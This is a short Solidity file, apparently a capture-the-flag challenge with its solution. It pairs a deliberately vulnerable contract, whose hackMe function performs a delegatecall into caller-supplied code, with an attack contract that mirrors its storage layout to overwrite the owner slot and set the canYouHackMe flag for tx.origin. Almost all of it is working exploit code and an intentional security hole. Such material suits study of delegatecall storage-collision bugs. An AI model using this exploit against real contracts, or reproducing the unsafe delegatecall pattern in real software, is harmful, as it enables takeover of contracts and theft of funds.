// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract D31eg4t3 {
    uint256 a = 12345;
    uint8 b = 32;
    string private d;
    uint32 private c;
    string private mot;
    address public owner;
    mapping(address => bool) public canYouHackMe;

    modifier onlyOwner() {
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns (bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }

    function hacked() public onlyOwner {
        canYouHackMe[msg.sender] = true;
    }
}

contract D31eg4t3Hack {
    uint256 placeholder1 = 12345;
    uint8 placeholder2 = 32;
    string private placeholder3;
    uint32 private placeholder4;
    string private placeholder5;
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function hackd31eg4t3(D31eg4t3 delegate) external {
        delegate.hackMe(abi.encodeWithSignature("changeOwnerAndMapping()"));
    }

    function changeOwnerAndMapping() external {
        owner = tx.origin;
        canYouHackMe[tx.origin] = true;
    }
}
